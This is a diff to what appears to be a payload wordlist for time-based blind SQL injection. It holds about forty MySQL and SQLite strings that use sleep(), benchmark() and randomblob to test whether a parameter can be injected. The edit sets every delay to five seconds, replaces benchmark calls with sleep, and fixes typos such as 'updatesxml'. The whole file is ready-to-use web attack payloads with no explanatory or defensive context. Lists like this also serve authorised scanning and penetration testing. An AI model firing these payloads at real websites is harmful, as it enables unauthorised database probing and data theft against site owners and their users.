@@ -1,40 +1,40 @@
-/|' and (select * from (select(sleep(4)))a)
-/|' and (select * from (select(sleep(4)))a)
-/| and (select 1 from (select(sleep(3)))x)
-/|" and (select 2 from (select(sleep(2)))y)
-/| and (select 1 from (select(sleep(2)))x)
-/|' and (select 7544 from (select(sleep(3)))kNzZ) and 'vjXn'='vjXn
-/|' and (select(sleep(3)))#
-/|' xor (select(6217) from (select(sleep(2)))a) xor 'b
-/|' and 9539=like('ABCDEFG', upper(hex(randomblob(200000000/2))))--
-/|' and (select 1 from (select(sleep(2)))x)--
-/|' or (select(sleep(3)))#
-/| and 2254=benchmark(3000000,md5(1))--
-/|' and (select 1 from (select(sleep(3)))x)
-/|' union select sleep(3),2,3--
-/| and 2212=benchmark(4000000,sha1(1))--
-/|'-(select 6345 from (select(sleep(2)))a)-'
-/|)+and sleep(2) and (1182=1182
-/| or 2 between 1 and benchmark(2000000,md5(1))--
-/|' and (select 1 from (select(sleep(2)))x)--
-/| and (select 1 from (select(sleep(2)))and 5=5
-/|' or (select * from (select(sleep(4)))a) union select 1--
-/|')) or (select(sleep(3)))#
-/|' and (select 2323 from (select(sleep(2)))a) and '1'='1
-/|" or (select 1 from(select(sleep(3)))x) or "1"="1
-/|' and 2212=benchmark(5000000,sha1(1))--
-/|' and (select(sleep(4))) order by 1--
-/|' and (select(sleep(3))) procedure analyse()--
+/|' and (select * from (select(sleep(5)))a)
+/|' and (select * from (select(sleep(5)))a)
+/| and (select 1 from (select(sleep(5)))x)
+/|" and (select 2 from (select(sleep(5)))y)
+/| and (select 1 from (select(sleep(5)))x)
+/|' and (select 7544 from (select(sleep(5)))kNzZ) and 'vjXn'='vjXn
+/|' and (select(sleep(5)))#
+/|' xor (select(6217) from (select(sleep(5)))a) xor 'b
+/|' and 9539=like('ABCDEFG', upper(hex(randomblob(500000000/2))))--
+/|' and (select 1 from (select(sleep(5)))x)--
+/|' or (select(sleep(5)))#
+/| and 2254=(select(sleep(5)))--
+/|' and (select 1 from (select(sleep(5)))x)
+/|' union select sleep(5),2,3--
+/| and 2212=(select(sleep(5)))--
+/|'-(select 6345 from (select(sleep(5)))a)-'
+/|)+and sleep(5) and (1182=1182
+/| or 2 between 1 and (select(sleep(5)))--
+/|' and (select 1 from (select(sleep(5)))x)--
+/| and (select 1 from (select(sleep(5)))x) and 5=5
+/|' or (select * from (select(sleep(5)))a) union select 1--
+/|')) or (select(sleep(5)))#
+/|' and (select 2323 from (select(sleep(5)))a) and '1'='1
+/|" or (select 1 from(select(sleep(5)))x) or "1"="1
+/|' and 2212=(select(sleep(5)))--
+/|' and (select(sleep(5))) order by 1--
+/|' and (select(sleep(5))) procedure analyse()--
 /|' and (select 1 from (select(sleep(5)))k) or 'a'='a
-/|' or (select * from (select(sleep(3)))b) and '1'='1
-/|' and updatesxml(1,concat(0x3a,(select(sleep(3)))),1)--
-/|' and extractvalue(1,concat(0x3a,(select(sleep(4)))))--
-/|' and json_keys((select convert((select(sleep(3))) using utf8)))--
-/|") or (select 4421 from (select(sleep(4)))x) or ("1"="1
+/|' or (select * from (select(sleep(5)))b) and '1'='1
+/|' and updatexml(1,concat(0x3a,(select(sleep(5)))),1)--
+/|' and extractvalue(1,concat(0x3a,(select(sleep(5)))))--
+/|' and json_keys((select convert((select(sleep(5))) using utf8)))--
+/|") or (select 4421 from (select(sleep(5)))x) or ("1"="1
 /|' and (select 1 from (select(sleep(5)))a) procedure analyse(extractvalue(1,1),1)--
-/|' and (select 1 from(select(sleep(3)))x) union select '1'--
-/|' xor (select 1 from (select(sleep(4)))a) xor '1'='1
-/|' and 3121=benchmark(6000000,md5(now()))--
-/|')) and (select 1 from (select(sleep(3)))x) and (('1'='1
-/|' or (select 1 from (select(sleep(4)))a) is null--
-/|' and (select 1 from (select(sleep(3)))a) in (1,2,3)--
+/|' and (select 1 from(select(sleep(5)))x) union select '1'--
+/|' xor (select 1 from (select(sleep(5)))a) xor '1'='1
+/|' and 3121=(select(sleep(5)))--
+/|')) and (select 1 from (select(sleep(5)))x) and (('1'='1
+/|' or (select 1 from (select(sleep(5)))a) is null--
+/|' and (select 1 from (select(sleep(5)))a) in (1,2,3)--
